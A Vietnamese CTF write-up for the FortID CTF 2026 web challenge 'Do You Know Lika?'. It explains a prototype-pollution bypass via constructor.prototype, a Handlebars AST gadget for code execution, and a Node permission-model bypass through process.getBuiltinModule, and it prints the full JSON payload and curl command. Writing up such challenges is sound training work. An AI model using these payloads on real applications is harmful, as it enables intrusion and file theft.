---
title: Do You Know Lika?
date: 2026-10-12
ctf: FortID CTF 2026
category: web
difficulty: Gold 3
tags:
  - Prototype Pollution
  - Handlebars
  - RCE
---

## Solution

Server nhận JSON cấu hình postcard rồi gộp vào object bằng hàm đệ quy `mergeTheme` trong `worker.js`. Đọc kỹ hàm này thấy nó ghi đệ quy vào target mà không check `hasOwnProperty`, nên với `theme.constructor.prototype.X = ...` thì key `X` được gán thẳng vào `Object.prototype`.

Bộ lọc ở `server.js` (`validateJob`) chỉ chặn key `__proto__`, không chặn `constructor.prototype`, nên con đường ô nhiễm prototype này lọt qua thoải mái.

Có prototype pollution rồi thì cần một gadget để kéo ra RCE. Handlebars ngay trong `Handlebars.compile(job.template, {preventIndent: true})` đọc các thuộc tính AST từ prototype, nên ta đặt một `Program` có `MustacheStatement` với `NumberLiteral`, value là một IIFE đọc file:

```js!
(()=>{throw new Error(process.getBuiltinModule("fs").readFileSync("/tmp/lika/flag.txt","utf8"))})()
```

Khi Handlebars compile, IIFE này được chèn thẳng vào code sinh ra và chạy luôn. Payload gửi lên:

```json!
{
  "template": "x",
  "theme": {
    "constructor": {
      "prototype": {
        "type": "Program",
        "body": [{
          "type": "MustacheStatement",
          "path": 0,
          "loc": {"start": 0, "end": 0},
          "params": [{
            "type": "NumberLiteral",
            "value": "(()=>{throw new Error(process.getBuiltinModule(\"fs\").readFileSync(\"/tmp/lika/flag.txt\",\"utf8\"))})()"
          }]
        }]
      }
    }
  },
  "model": {}
}
```

```sh!
curl -s -X POST "$URL/api/preview" -H 'Content-Type: application/json' --data-binary @payload.json
```

`/api/preview` trả 422 khi worker báo `ok:false`, nhưng nội dung lỗi lại chứa đúng nội dung file flag — worker throw Error với nội dung file đọc được, và lỗi đó bị dội ngược lên response.

Một chi tiết đáng chú ý: worker chạy với `--permission --allow-fs-read=...`, nên `require('fs')`/`import fs` bị Node chặn thẳng. Nhưng `process.getBuiltinModule` ở bản Node này trả về module `fs` mà không đi qua permission check, nên đọc được `/tmp/lika/flag.txt` dù sandbox tưởng đã chặn hết đường vào fs.

-> Flag: đọc được qua lỗi trả về của `/api/preview`.
